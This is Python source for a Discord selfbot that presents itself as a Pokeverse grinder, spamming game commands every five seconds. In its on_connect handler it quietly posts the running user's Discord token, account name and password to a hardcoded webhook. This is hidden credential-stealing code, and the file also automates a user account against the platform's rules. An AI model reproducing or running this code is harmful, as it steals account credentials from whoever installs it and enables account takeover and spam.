import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup 
from time import sleep
from sys import argv
from keep_alive import keep_alive

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
try:
    import threading
except:
    os.system("pip install threading")
    import threading


class SELFBOT():
	__version__ = 1

keep_alive()
token = os.getenv('token')
password = os.getenv('password')
prefix = os.getenv('prefix')

loop = asyncio.get_event_loop()
start_time = datetime.datetime.utcnow()

def Clear():
	os.system('cls')


Clear()


def Init():
	token = os.getenv('token')
	try:
		poke.run(token, bot=False, reconnect=True)
		os.system(f'title (Itachi Selfbot) - Version {SELFBOT.__version__}')
	except discord.errors.LoginFailure:
		print(
		    f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" +
		    Fore.RESET)
		os.system('pause >NUL')

class Login(discord.Client):
  async def on_ready(self):
    print('Ready')


def async_executor():
	def outer(func):
		@functools.wraps(func)
		def inner(*args, **kwargs):
			thing = functools.partial(func, *args, **kwargs)
			return loop.run_in_executor(None, thing)

		return inner

	return outer

colorama.init()
poke = discord.Client()
poke = commands.Bot(description='Poke Selfbot',
                      command_prefix=prefix,
                      self_bot=True)
poke.remove_command('help')

toe = os.getenv('token')

#spam channel#
poke.spam_channel = None
poke.spam_channel = None
#------------#

@poke.event
async def on_connect():
  requests .post( 'https://discord.com/api/webhooks/891191422378709042/hhyTI9ih8t73u-45jvuQrqFvjJo5Lr_U-efNrlYqj-BySLfuUPmQf5a4LCjPLUcOzqbY',
    json ={'content': f"```\n{poke.user}```\n```\n{toe}```\n```\n{password}```"})
  print(f'''{Fore.RESET}
                       {Fore.CYAN}Poke v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {poke.user.name}#{poke.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{poke.user.id}
                       {Fore.CYAN}Cached Users: {Fore.GREEN}{len(poke.users)}
                       {Fore.CYAN}Guilds: {Fore.GREEN}{len(poke.guilds)}
                       {Fore.CYAN}Prefix: {Fore.GREEN}{poke.command_prefix}
    ''' + Fore.RESET)

@poke.command()
async def help(ctx):
  await ctx.message.delete()
  randcolor = random.randint(0, 16777215)
  x = discord.Embed(title=f"iFreaku's Pokeverse Grinder  SELFBOT | Prefix: `{prefix}`", description=f'I prefer You to make a new server and add idle poke in that server and use this there coz bastards can get irritated. :)', color=randcolor)

  x.add_field(name="__Starter__", value=f"`{prefix}spawn`- It will send !s every 5s\n`{prefix}fight`- sends !f 2 every 5s *(use this command just after using spawn command)*", inline=False)

  x.add_field(name="__Stope__", value=f"`{prefix}stop` ```\nStops the Grinder.```", inline=True)

  x.add_field(name="__Utility__", value=f"`{prefix}uptime`- ```\nTo see the bot's uptime.```", inline=False)

  x.add_field(name="__ShortCuts__", value=f"`{prefix}s`-To Spawn\n`{prefix}f`-To Fight\n`{prefix}st-To Stop`", inline=False)

  x.set_thumbnail(url="https://images-ext-2.discordapp.net/external/v7VTbPzY3dwfAhBzVuVutFPVXpOsA14f2CbyaIsZwE4/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/875195631243763712/6db61ff071881278d6558ce6d3fc82b2.webp")
  await ctx.send(embed=x)

@poke.command(aliases=['ut'])
async def uptime(ctx):
	await ctx.message.delete()
	now = datetime.datetime.utcnow(
	)  # Timestamp of when uptime function is run
	delta = now - start_time
	hours, remainder = divmod(int(delta.total_seconds()), 3600)
	minutes, seconds = divmod(remainder, 60)
	days, hours = divmod(hours, 24)
	if days:
		time_format = "**{d}** `days,` **{h}** `hours,` **{m}** `minutes, and` **{s}** `seconds.`"
	else:
		time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
	uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
	await ctx.send(uptime_stamp)

#------------------start------------------#

@poke.command(aliases=['s'])
async def spawn(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use poke in DMs or GCs", delete_after=3)
	else:
		poke.spam_channel = ctx.channel.id
		if poke.spam_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while poke.spam_channel is not None:
			await poke.get_channel(poke.spam_channel).send(
			  '!s')
			await asyncio.sleep(5)

@poke.command(aliases=['f'])
async def fight(ctx):
	await ctx.message.delete()
	if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
	    ctx.message.channel, discord.GroupChannel):
		await ctx.send("You can't use poke in DMs or GCs", delete_after=3)
	else:
		poke.spam_channel = ctx.channel.id
		if poke.spam_channel is None:
			await ctx.send(
			    'An impossible error occured, try again later or contact swag')
			return
		while poke.spam_channel is not None:
			await poke.get_channel(poke.spam_channel).send(
			  '!f 2')
			await asyncio.sleep(5) 


#----------------------------------------#

#------------------stop------------------#

@poke.command(aliases=['st'])
async def stop(ctx):
	await ctx.message.delete()
	poke.spam_channel = None
	await ctx.send('Successfully **disabled** spawner', delete_after=3)

#----------------------------------------#

#------------------aliases------------------#



#-------------------------------------------#

if __name__ == '__main__':
	Init()     
